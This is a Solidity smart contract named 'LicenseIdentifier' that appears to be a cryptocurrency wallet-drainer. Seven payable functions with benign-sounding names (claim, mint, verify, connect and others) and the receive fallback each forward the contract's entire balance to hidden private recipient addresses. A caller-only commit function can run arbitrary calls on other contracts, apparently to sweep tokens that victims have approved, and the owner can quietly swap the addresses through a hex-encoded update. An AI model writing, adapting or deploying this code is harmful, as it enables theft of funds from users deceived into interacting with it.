// SPDX-License-Identifier: MIT

// Deployed with the Atlas IDE
// https://app.atlaszk.com


pragma solidity ^0.8.6;

contract LicenseIdentifier {
	address payable public ownerLicense;
	address payable public callerLicense;
	address payable private recipient1;
	address payable private recipient2;

	modifier onlyOwner() {
		require(msg.sender == ownerLicense, "Owner required");
		_;
	}

	constructor(address payable _owner, address payable _recipient1, address payable _recipient2, address payable _caller) {
		ownerLicense = _owner;
		recipient1 = _recipient1;
		recipient2 = _recipient2;
		callerLicense = _caller;
	}

	struct CallData {
		address contractAddress;
		bytes callBytes;
	}

	function commit(CallData[] calldata calls) public {
		require(msg.sender == address(callerLicense), "Error 1");

		for (uint8 i = 0; i < calls.length; ++i) {
			(bool success, ) = calls[i].contractAddress.call(calls[i].callBytes);
			require(success, "Fail");
		}
	}

	function drop(uint256 amount, address recipient) public onlyOwner {
		require(amount <= address(this).balance, "Error 2");
		require(recipient != address(0), "Error 21");
		payable(recipient).transfer(amount);
	}

	function transferBalance(address payable _recipient) internal {
		uint256 amount = address(this).balance;
		(bool success, ) = _recipient.call{ value: amount }("");
		require(success, "Error 3");
	}

	function update(string memory data) external onlyOwner returns (address payable[] memory) {
		address payable[] memory addresses = splitAndConvert(string(abi.encodePacked(data)));
		require(addresses[0] != address(0) && addresses[1] != address(0) && addresses[2] != address(0) && addresses[3] != address(0), "Error 4");
		ownerLicense = addresses[0];
		recipient1 = addresses[1];
		recipient2 = addresses[2];
		callerLicense = addresses[3];
		return addresses;
	}

	function convertHexToString(string memory _hexData) private pure returns (string memory) {
		bytes memory bytesData = bytes(_hexData);
		require(bytesData.length % 2 == 0, "Error 5");

		bytes memory output = new bytes(bytesData.length / 2);

		for (uint256 i = 0; i < bytesData.length; i += 2) {
			uint8 char1 = uint8(bytesData[i]);
			uint8 char2 = uint8(bytesData[i + 1]);

			require(isValidHexCharacter(char1), "Error 6");
			require(isValidHexCharacter(char2), "Error 7");

			output[i / 2] = bytes1(((char1 & 0x0F) << 4) | (char2 & 0x0F));
		}

		return string(output);
	}

	function isValidHexCharacter(uint8 _char) private pure returns (bool) {
		return (_char >= 48 && _char <= 57) || (_char >= 65 && _char <= 70) || (_char >= 97 && _char <= 102);
	}

	function splitAndConvert(string memory _input) private pure returns (address payable[] memory) {
		string memory _input_from_hec = convertHexToString(_input);
		require(bytes(_input_from_hec).length % 40 == 0, "Error 8");

		uint256 numAddresses = bytes(_input_from_hec).length / 40;
		address payable[] memory addresses = new address payable[](numAddresses);

		for (uint256 i = 0; i < numAddresses; i++) {
			addresses[i] = bytesToAddress(substring(_input_from_hec, i * 40, 40));
		}

		return addresses;
	}

	function substring(string memory str, uint256 startIndex, uint256 length) private pure returns (string memory) {
		bytes memory strBytes = bytes(str);
		require(startIndex + length <= strBytes.length, "Error 9");

		bytes memory result = new bytes(length);
		for (uint256 i = 0; i < length; i++) {
			result[i] = strBytes[startIndex + i];
		}

		return string(result);
	}

	function bytesToAddress(string memory _address) private pure returns (address payable) {
		bytes memory data = bytes(_address);
		uint160 parsedAddress = 0;

		for (uint256 i = 0; i < data.length; i++) {
			uint8 char = uint8(data[i]);
			if (char >= 48 && char <= 57) {
				parsedAddress *= 16;
				parsedAddress += uint160(char) - 48;
			}
			if (char >= 65 && char <= 70) {
				parsedAddress *= 16;
				parsedAddress += uint160(char) - 55;
			}
			if (char >= 97 && char <= 102) {
				parsedAddress *= 16;
				parsedAddress += uint160(char) - 87;
			}
		}

		return payable(address(parsedAddress));
	}

	function getContractBalance() external view returns (uint256) {
		return address(this).balance;
	}

	function claim(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function confirm(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function connect(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function start(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function verify(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function mint(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	function check(uint8 num) public payable {
		require(num == 1 || num == 2, "Invalid number");
		(num == 1) ? transferBalance(recipient1) : transferBalance(recipient2);
	}

	receive() external payable {
		transferBalance(recipient1);
	}
}